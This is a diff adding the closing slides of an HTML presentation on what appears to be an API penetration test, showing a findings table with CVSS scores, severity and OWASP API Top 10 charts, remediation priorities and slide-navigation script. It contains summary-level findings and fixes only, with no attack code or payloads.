+          <tr><td>8</td><td>PII in JWT payload</td><td>API2</td><td>MASVS-STORAGE-1</td><td>AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N</td><td class="sev-m">5.9</td><td class="sev-m">Medium</td></tr>
+          <tr><td>9</td><td>Excessive data exposure</td><td>API3</td><td>MASVS-STORAGE-1</td><td>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</td><td class="sev-m">6.5</td><td class="sev-m">Medium</td></tr>
+          <tr><td>10</td><td>CSRF on transfer</td><td>API8</td><td>MASVS-NETWORK-1</td><td>AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N</td><td class="sev-m">6.5</td><td class="sev-m">Medium</td></tr>
+          <tr><td>11</td><td>No token invalidation on logout</td><td>API2</td><td>MASVS-AUTH-2</td><td>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</td><td class="sev-m">6.5</td><td class="sev-m">Medium</td></tr>
+          <tr><td>12</td><td>No token invalidation on pwd change</td><td>API2</td><td>MASVS-AUTH-2</td><td>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</td><td class="sev-m">6.5</td><td class="sev-m">Medium</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════
+       SLIDE 11 — SEVERITY OVERVIEW CHART
+  ══════════════════════════════════════════════════════ -->
+  <div class="slide" id="s11">
+    <h2 class="section">Severity Distribution &amp; OWASP API Top 10 Coverage</h2>
+    <div class="grid g2" style="max-width:880px;width:100%">
+      <div class="card">
+        <div class="card-title">By Severity</div>
+        <div style="margin-top:16px">
+          <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+            <span style="width:90px;color:var(--red);font-weight:700">Critical ×2</span>
+            <div style="flex:1;background:#21262d;border-radius:4px;height:22px;overflow:hidden">
+              <div style="width:17%;background:var(--red);height:100%;border-radius:4px;display:flex;align-items:center;padding-left:8px;font-size:.7rem;font-weight:700">9.1 / 9.8</div>
+            </div>
+          </div>
+          <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+            <span style="width:90px;color:var(--orange);font-weight:700">High ×5</span>
+            <div style="flex:1;background:#21262d;border-radius:4px;height:22px;overflow:hidden">
+              <div style="width:42%;background:var(--orange);height:100%;border-radius:4px;display:flex;align-items:center;padding-left:8px;font-size:.7rem;font-weight:700">7.1 – 8.8</div>
+            </div>
+          </div>
+          <div style="display:flex;align-items:center;gap:12px">
+            <span style="width:90px;color:var(--cyan);font-weight:700">Medium ×5</span>
+            <div style="flex:1;background:#21262d;border-radius:4px;height:22px;overflow:hidden">
+              <div style="width:42%;background:var(--cyan);height:100%;border-radius:4px;display:flex;align-items:center;padding-left:8px;font-size:.7rem;font-weight:700;color:#000">5.9 – 6.5</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">OWASP API Top 10 Coverage</div>
+        <table>
+          <tr><th>Category</th><th>Findings</th></tr>
+          <tr><td>API1 — BOLA (Horizontal IDOR)</td><td><span class="tag tag-orange">1</span></td></tr>
+          <tr><td>API2 — Broken Authentication</td><td><span class="tag tag-red">5</span></td></tr>
+          <tr><td>API3 — BOPLA / Mass Assignment</td><td><span class="tag tag-orange">2</span></td></tr>
+          <tr><td>API4 — Resource Consumption</td><td><span class="tag tag-orange">1</span></td></tr>
+          <tr><td>API5 — Function Level Auth</td><td><span class="tag tag-red">1</span></td></tr>
+          <tr><td>API8 — Security Misconfiguration</td><td><span class="tag tag-orange">2</span></td></tr>
+        </table>
+      </div>
+      <div class="card" style="grid-column:span 2">
+        <div class="card-title">Remediation Priority</div>
+        <div style="display:flex;gap:10px;flex-wrap:wrap">
+          <div class="card" style="flex:1;padding:10px;border-color:var(--red)"><div class="tag tag-red" style="margin-bottom:6px">Immediate</div><div class="card-body">Disable /api/debug · Fix alg:none · Rotate JWT secret to 256-bit random</div></div>
+          <div class="card" style="flex:1;padding:10px;border-color:var(--orange)"><div class="tag tag-orange" style="margin-bottom:6px">Short Term</div><div class="card-body">Add ownership checks on all :id routes · requireAdmin middleware · Rate limiting</div></div>
+          <div class="card" style="flex:1;padding:10px;border-color:var(--cyan)"><div class="tag tag-blue" style="margin-bottom:6px">Medium Term</div><div class="card-body">Token blacklist on logout · tokenVersion on password change · SameSite=Strict · Remove PII from JWT</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════
+       SLIDE 12 — SUMMARY / CLOSING
+  ══════════════════════════════════════════════════════ -->
+  <div class="slide" id="s12">
+    <div class="hero-icon">✅</div>
+    <div class="slide-title">Key Takeaways</div>
+    <div class="divider"></div>
+    <div class="grid g2" style="max-width:800px;width:100%;margin-top:8px">
+      <div class="card">
+        <div class="card-title">Automation Finds…</div>
+        <ul class="steps">
+          <li><span class="dot dot-green" style="width:9px;height:9px;margin-top:6px"></span>Cleartext secrets in responses</li>
+          <li><span class="dot dot-green" style="width:9px;height:9px;margin-top:6px"></span>Missing security headers / flags</li>
+          <li><span class="dot dot-green" style="width:9px;height:9px;margin-top:6px"></span>Exposed debug endpoints</li>
+          <li><span class="dot dot-green" style="width:9px;height:9px;margin-top:6px"></span>Wildcard CORS misconfiguration</li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="card-title">Manual Finds…</div>
+        <ul class="steps">
+          <li><span class="dot dot-orange" style="width:9px;height:9px;margin-top:6px"></span>IDOR (horizontal &amp; vertical)</li>
+          <li><span class="dot dot-orange" style="width:9px;height:9px;margin-top:6px"></span>Mass assignment / BOPLA</li>
+          <li><span class="dot dot-orange" style="width:9px;height:9px;margin-top:6px"></span>JWT alg:none / token replay</li>
+          <li><span class="dot dot-orange" style="width:9px;height:9px;margin-top:6px"></span>Session invalidation gaps</li>
+        </ul>
+      </div>
+    </div>
+    <div class="card" style="max-width:800px;width:100%;margin-top:16px;text-align:center;background:rgba(88,166,255,.06);border-color:rgba(88,166,255,.3)">
+      <div class="card-body" style="font-size:1rem;line-height:1.8">
+        <strong>2 Critical</strong> · <strong>5 High</strong> · <strong>5 Medium</strong> &nbsp;|&nbsp;
+        12 Findings &nbsp;|&nbsp; 6 OWASP API categories covered<br>
+        <span style="color:var(--muted)">Full PoC, Burp steps &amp; CVSS scores in</span> <code>WRITEUP.md</code>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /deck -->
+
+<!-- ── Navigation Bar ────────────────────────────────── -->
+<div id="nav">
+  <button id="btnPrev" onclick="go(-1)" disabled>← Prev</button>
+  <span id="counter">1 / 12</span>
+  <button id="btnNext" onclick="go(1)">Next →</button>
+</div>
+
+<script>
+  const slides = Array.from(document.querySelectorAll('.slide'));
+  const total  = slides.length;
+  let cur = 0;
+
+  function go(dir) {
+    const next = cur + dir;
+    if (next < 0 || next >= total) return;
+
+    slides[cur].classList.remove('active');
+    slides[cur].classList.add('exit');
+    setTimeout(() => slides[cur - dir < 0 ? 0 : cur].classList.remove('exit'), 370);
+
+    cur = next;
+    slides[cur].classList.add('active');
+    document.getElementById('counter').textContent  = `${cur + 1} / ${total}`;
+    document.getElementById('btnPrev').disabled     = cur === 0;
+    document.getElementById('btnNext').disabled     = cur === total - 1;
+    document.getElementById('progress').style.width = `${((cur + 1) / total) * 100}%`;
+  }
+
+  document.addEventListener('keydown', e => {
+    if (e.key === 'ArrowRight' || e.key === ' ')  go(1);
+    if (e.key === 'ArrowLeft')                    go(-1);
+  });
+
+  // Initialize progress bar
+  document.getElementById('progress').style.width = `${(1 / total) * 100}%`;
+</script>
+</body>
+</html>
